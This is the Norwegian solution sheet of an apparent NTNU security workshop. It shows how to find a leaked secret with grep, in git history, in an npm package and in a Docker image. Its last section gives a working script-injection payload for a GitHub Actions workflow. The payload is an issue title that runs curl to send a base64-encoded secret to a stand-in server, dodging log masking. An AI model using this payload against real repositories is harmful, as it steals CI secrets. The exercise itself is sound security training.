# Løsning

## Hardkodet hemmelighet

2 muligheter:

1. Åpne repoet i din favoritt-IDE (f.eks VS Code) og søk etter "ntnuws".
2. Vha. grep-kommandoen: `grep -r "ntnuws" *`

## I Git-historikken

2 muligheter:

1. `git grep "ntnuws" $(git rev-list --all)`
2. `git log -G ntnuws` for å liste commits, deretter `git show` på hver enkelt commit

## I npm-pakka

Ved å installere pakka:

1. Opprett et nytt Node.js-prosjekt (`npm init -y` i en tom katalog)
2. `npm install @ntnu-ws/funkystuff@1.0.0`
3. `cd node_modules/@ntnu-ws/funkystuff`
4. `find . -name "*.env"`
5. `cat <.env-fila>`

Ved å laste ned pakka som en tarball:
1. `npm view @ntnu-ws/funkystuff@1.0.0`, URL-en står i feltet `dist.tarbal.`
2. `curl <URL> -H "Authorization: Bearer <access-tokenet du opprettet i setup-delen>" -o funky.tgz`
3. `tar xzvf funky.tgz`
4. `find package/ -name "*.env"`
5. `cat <.env-fila>`

## I Docker-imaget

Ved å kjøre imaget:

1. `docker run -it ghcr.io/ntnu-ws/funkystuff:1.20260202051105`
2. `find / -name "*.env"`
3. `cat <.env-fila>`

Ved å laste ned imaget:

1. `docker save ghcr.io/ntnu-ws/funkystuff:1.20260202051105 -o funkystuff.tar``
2. `mkdir extracted && tar xvf funkystuff.tar -C extracted`
3. Pakk ut alle `layer.tar`-filene i underkatalogene til du finner det du leter etter.

## Eksfiltrere fra byggejobb ("a.k.a. action")

I jobben `./github/workflows/issue_alerting.yaml` (som kjøres hver gang et issue opprettes eller endres) brukes issue-tittelen uten sanitisering som input rett i en shell-kommando. Dette betyr at den som oppretter issuet kan kjøre vilkårlige [kommandoer](https://docs.github.com/en/actions/concepts/security/script-injections).

I tillegg er en hemmelighet tilgjengeliggjort for jobben i form av miljøvariabelen "ISSUE_THING". For å stjele denne kan du opprette et nytt issue med tittel:

 `whatever" && curl -d "data=$(echo $ISSUE_THING | base64)" https://minserver #`

`"` avslutter den opprinnelige kommandoen. Deretter POST'es de stjålne dataene til din server vha curl. Her kan man også bruke andre verktøy som kan sende data over nettverket, feks [Netcat](https://en.wikipedia.org/wiki/Netcat). Til slutt brukes `#` til å sørge for at resten av linja tolkes som en kommentar, og dermed ikke forsøkes kjørt.

Hvis du ikke har en webserver tilgjengelig kan du bruke https://webhook.site/. 

GitHub vil gjøre halvhjertede forsøk på å obfuskere hemmeligheter slik at de ikke skal havne i logger. Dette er imidlertid enkelt å omgå med litt lett obfuskering slik som det gjøres her med Base64.
 